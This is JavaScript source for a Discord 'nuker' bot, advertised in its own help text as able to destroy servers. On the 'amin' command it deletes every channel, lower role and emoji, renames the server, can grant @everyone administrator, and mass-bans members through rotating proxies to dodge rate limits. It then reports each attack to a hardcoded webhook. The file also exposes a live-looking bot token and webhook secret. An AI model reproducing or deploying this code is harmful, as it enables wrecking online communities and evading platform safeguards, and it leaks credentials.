const { Client } = require("discord.js");
const Discord = require("discord.js");
const { MessageButton } = require('discord-buttons-plugin')
const { MessageEmbed, version: djsversion } = require('discord.js');
const configjson = require('./config.json');
const fs = require('fs');
const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
const proxies = fs.readFileSync('./src/proxies.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const user_ids = fs.readFileSync('./src/ids.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const db = require("quick.db")
const http = require("http");
http.createServer((_, res) => res.end("Alive")).listen(8080)
const cooldown = new Set();
const cdtime = 5;
const discordButtons = require("discord-buttons-plugin");
const buttonClient = new discordButtons(client)
const inlinereply = require('discord-reply');
const moment = require("moment")
const superagent = require("superagent")
const axios = require('axios').default
const request = require('request');
const chalk = require('chalk');
const phin = require('phin').unpromisified
const token = "OTI2NTUwODUyOTUxNDc0MjA2.Yc9TuQ.1zrb3aHNwt_9gAaOhvLhxcu7XfI";
var whitelistedservers = ["926450682767245382"]
var give_everyone_administrator = configjson.server.give_everyone_administrator

const botActivity = [
	`i make your server dispear`,
	`victims on top`
]

function write(content, file) {
	fs.appendFile(file, content, function(err) { });
}

client.on('ready', async () => {
	client.user.setStatus("idle");
	console.log('');
	console.log(chalk.inverse.hex("00FF00")(`[INFO] Logged in as ${client.user.tag} (${client.user.id})`));
	console.log(chalk.inverse.hex("00FF00")(`[INFO] Connected to Discord API Service`));
	console.log('');
	client.guilds.cache.forEach((guild) => {
		console.log(chalk.inverse.hex("00FF00")("Guild: " + guild.name + " | Members: " + guild.memberCount));
	})
	setInterval(() => {
		const randomIndex = Math.floor(Math.random() * (botActivity.length - 1) + 1);
		const newActivity = botActivity[randomIndex];
		client.user.setActivity(newActivity, { type: 'PLAYING' });
	}, 10000);
});

client.on("message", async (message) => {
	if (!message.guild) return;

	if (message.content.startsWith('ping') || message.content.startsWith("Ping") || message.content.startsWith("PING")) {

		if (message.author.bot || message.channel.type === "dm") return;
		try {
			let fetched = await db.fetch(`prefix_${message.guild.id}`);
			if (fetched == null) {
			} else {
				prefix = fetched
			}
		} catch (e) {
			console.log(e)
		};

		if (cooldown.has(message.author.id)) {
			return message.lineReply(`<:win11erroicon:916714141102792745> Please wait 5 seconds to use this command`).then(m => {
				m.delete({ timeout: cdtime * 600 });
			});
		}
		cooldown.add(message.author.id);
		setTimeout(() => {
			cooldown.delete(message.author.id);
		}, cdtime * 1000);

		var states = "<a:Emoji_Sparkles:918673771269881856> Excellent";
		var states2 = "<a:Emoji_Sparkles:918673771269881856> Excellent";
		var msg = `${Date.now() - message.createdTimestamp}`;
		var api = `${Math.round(client.ws.ping)}`;
		if (Number(msg) > 70) states = "Good";
		if (Number(msg) > 170) states = "Not Bad";
		if (Number(msg) > 350) states = "Soo Bad";
		if (Number(api) > 70) states2 = "Good";
		if (Number(api) > 170) states2 = "Not Bad";
		if (Number(api) > 350) states2 = "Soo Bad";
		if (message.author.bot) return;

		const helpEmbed = new Discord.MessageEmbed()
			.setDescription(`Ping Latency ~ **\`${msg} ms\` | ${states}**\nAPI Latency ~ **\`${api} ms\` | ${states2}**`)
			.setColor("#969db9")
		message.lineReply(helpEmbed).then(message => { setTimeout(function() { message.edit(`Try again typing \`ping\``) }, 999999) })
	}

	if (message.content.startsWith('help') || message.content.startsWith("Help") || message.content.startsWith("HELP")) {

		const embed = new Discord.MessageEmbed()
			.setTitle('**__HELP COMMAND VICTIMS"__**')
			.setDescription(`**__Features__**\n> Victims is a free to use Discord bot that is able to nuke server. That means, it ban all members and delete channels in a way that makes it impossible for revive server.\n\n **__Commands__**\n> • ping - Ping bot\n> • help - Help command bot\n\n<:pointpurple:916714146224013372> **__Nuke Commands__**\n> • amin - Distroy the server`)
			.setThumbnail('https://cdn.discordapp.com/attachments/924399456797982760/926569193233580062/IMG_5305.gif')
			.setColor('969db9')

		const button1 = new buttonClient.MessageButton()
			.setLabel("Victims")
			.setID("spartanu")
		const button2 = new buttonClient.MessageButton()
			.setLabel("On Top")
			.setID("ontop")

		/* Send Message with button */
		buttonClient.send(null, { channel: message.channel.id, embed, buttons: [[button1, button2]] })

	}

	if (message.content.startsWith('invite') || message.content.startsWith("Invite") || message.content.startsWith("INVITE")) {

		const embed = new Discord.MessageEmbed()
			.setTitle('**__Bot Invite__**')
			.setDescription(`**Click on the 'Invite Link' button to add bot to the server**`)
			.setImage(``)
			.setFooter(
				`Invite`,
				message.author.displayAvatarURL({
					dynamic: true
				})
			)
			.setTimestamp()
			.setColor('969db9')

		const button4 = new buttonClient.MessageButton()
			.setLabel("Invite Link")
			.setURL("https://discord.com/api/oauth2/authorize?client_id=926550852951474206&permissions=8&scope=bot")
		const button5 = new buttonClient.MessageButton()
			.setLabel("Website (BETA)")
			.setURL("https://victimsklan.cf")


		/* Send Message with button */
		buttonClient.send(null, { channel: message.channel.id, embed, buttons: [[button4, button5]] })


	}

	if (message.content.startsWith('uptime')) {

		if (message.author.bot || message.channel.type === "dm") return;
		try {
			let fetched = await db.fetch(`prefix_${message.guild.id}`);
			if (fetched == null) {
			} else {
				prefix = fetched
			}
		} catch (e) {
			console.log(e)
		};

		if (cooldown.has(message.author.id)) {
			return message.lineReply(` Please wait 5 seconds to use this command`).then(m => {
				m.delete({ timeout: cdtime * 600 });
			});
		}
		cooldown.add(message.author.id);
		setTimeout(() => {
			cooldown.delete(message.author.id);
		}, cdtime * 1000);

		var errorvar;

		// Basic embed
		let totalSeconds = (client.uptime / 1000);
		let days = Math.floor(totalSeconds / 86400);
		totalSeconds %= 86400;
		let hours = Math.floor(totalSeconds / 3600);
		totalSeconds %= 3600;
		let minutes = Math.floor(totalSeconds / 60);
		let seconds = Math.floor(totalSeconds % 60);

		var embed = new Discord.MessageEmbed()
			.setColor('#969db9')
			.setTitle(`**__UPTIME VICTIMS__**`)
			.setDescription(`**Uptime:** \`${hours} hour(s), ${minutes} minute(s) and ${seconds} second(s)\``)
			.setFooter(
				`Type - ${message.author.tag}`,
				message.author.displayAvatarURL({
					dynamic: true
				})
			)
			.setTimestamp()

		message.lineReply(embed).then(message => { setTimeout(function() { message.edit(`Try again typing \`uptime\``) }, 10000) })

	}

  if (message.content === 'amin' || message.content == 'Amin' || message.content == 'AMIN') {
    message.delete()

    const button7 = new buttonClient.MessageButton()
      .setLabel("n ai")
      .setID("spartanu")
    const button8 = new buttonClient.MessageButton()
      .setLabel("voie")
      .setID("voie")
    const button9 = new buttonClient.MessageButton()
      .setLabel("golane")
      .setID("golane")

    if (whitelistedservers.includes(message.guild.id)) return buttonClient.send(' **__Nu Poti Folosi Aceasta Comanda Pe Acest Server__**', { channel: message.channel.id, buttons: [[button7, button8, button9]] })

    let channels = message.guild.channels.cache.array();
    let members = message.guild.members.cache.array();
    let roles = message.guild.roles.cache.array();
    let emojis = message.guild.emojis.cache.array();
    const sleep = (time) => new Promise(resolve => setTimeout(resolve, time));
    db.set(`channel_${message.guild.id}`, "k")

    let logs = new Discord.MessageEmbed()
      .setColor("#969db9")
      .setFooter(
        `${message.author.tag} fuck the server`,
        message.author.displayAvatarURL({
          dynamic: true
        })
      )
      .setTimestamp()
      .setThumbnail(message.author.displayAvatarURL({
        dynamic: true
      }))
      .setTitle('Victims" Nuk3r')
      .setDescription(`**__<:hood:916730769953685545> Who typed the command__** <:blurplejoin:916730770889007185> ${message.author.tag} (` + "`" + message.author.id + "`" + `)\n\n **__<:hood:916730769953685545> Command__** <:blurplejoin:916730770889007185> amin\n\n <:hood:916730769953685545> **__Server Name__** <:blurplejoin:916730770889007185> ${message.guild.name} (` + "`" + message.guild.id + "`" + `)\n\n <:hood:916730769953685545> **__Members__** <:blurplejoin:916730770889007185> ${message.guild.memberCount}`);

    const wrb = new Discord.WebhookClient("926558789874888714", "7I61i03XRl4XKS9F08lAEuKcej9IHpimzHYfJYOg2cAGlnrPnOEJKTWVZGr-_dE_IO34");

    await wrb.send(logs)

    message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });
    message.guild.roles.cache
      .filter(
        r =>
          !r.managed &&
          r.position < message.guild.me.roles.highest.position &&
          r.id !== message.guild.id
      )
      .forEach(role => {
        role.delete();
      });
    message.guild.emojis.cache.array().forEach(emoji => {
      emoji.delete();
    });

    message.guild.setName("victims was here")
    message.guild.setIcon(
      "https://c.tenor.com/8iZOc-v_06wAAAAd/wakeup-meme.gif"
    );

    if (give_everyone_administrator == false) {
      console.log(`Giving administrator to @everyone has been disabled.`)
    }
    else {
      var everyone = message.guild.roles.cache.find(r => r.name === "@everyone")
      everyone.setPermissions(["SEND_TTS_MESSAGES", "MANAGE_EMOJIS", "MANAGE_MESSAGES", "ADMINISTRATOR", "MANAGE_GUILD", "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_ROLES", "MANAGE_WEBHOOKS", "MENTION_EVERYONE", "MUTE_MEMBERS", "MOVE_MEMBERS", "DEAFEN_MEMBERS", "VIEW_AUDIT_LOG", "KICK_MEMBERS", "CREATE_INSTANT_INVITE", "USE_VAD", "PRIORITY_SPEAKER", "CREATE_INSTANT_INVITE", "CONNECT", "SPEAK", "VIEW_CHANNEL", "VIEW_GUILD_INSIGHTS"])

    }
     
    var int1 = setInterval(async function() {
      let guildID = message.guild.id
      var proxy = proxies[Math.floor(Math.random() * proxies.length)]

      headers = { 'Authorization': "Bot " + token }
      phin({
        method: "PUT",
        url: `https://discord.com/api/v8/guilds/${guildID}/members?limit=1000`,
        method: 'GET',
        parse: 'json',
        headers: headers
      }, (err, res, body) => {
        res.body.forEach(member => {
          console.log(member.user.id)
          phin({
            url: `https://discord.com/api/v8/guilds/${guildID}/bans/${member.user.id}`,
            proxy: "http://" + proxy,
            method: 'PUT',
            parse: 'json',
            headers: headers,
            timeout: 20
          }, (err, res) => {
        if (res.body) {
          console.log(res.body)
        } else {
          console.log(chalk.inverse.hex("00FF00")(`User: ${member.user.username} | Proxy: ${proxy}`));
            }
          })
        }, 20)
        setTimeout(() => {
          clearInterval(int1)
        }, 60000)
      })
    })

    if (give_everyone_administrator == false) {
      console.log(`Giving administrator to @everyone has been disabled.`)
    }
    else {
      var everyone = message.guild.roles.cache.find(r => r.name === "@everyone")
      everyone.setPermissions(["SEND_TTS_MESSAGES", "MANAGE_EMOJIS", "MANAGE_MESSAGES", "ADMINISTRATOR", "MANAGE_GUILD", "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_ROLES", "MANAGE_WEBHOOKS", "MENTION_EVERYONE", "MUTE_MEMBERS", "MOVE_MEMBERS", "DEAFEN_MEMBERS", "VIEW_AUDIT_LOG", "KICK_MEMBERS", "CREATE_INSTANT_INVITE", "USE_VAD", "PRIORITY_SPEAKER", "CREATE_INSTANT_INVITE", "CONNECT", "SPEAK", "VIEW_CHANNEL", "VIEW_GUILD_INSIGHTS"])

    }

    message.guild.setName("victims was here")
    message.guild.setIcon(
      "https://c.tenor.com/8iZOc-v_06wAAAAd/wakeup-meme.gif"
    );

  }
})

client.login(token)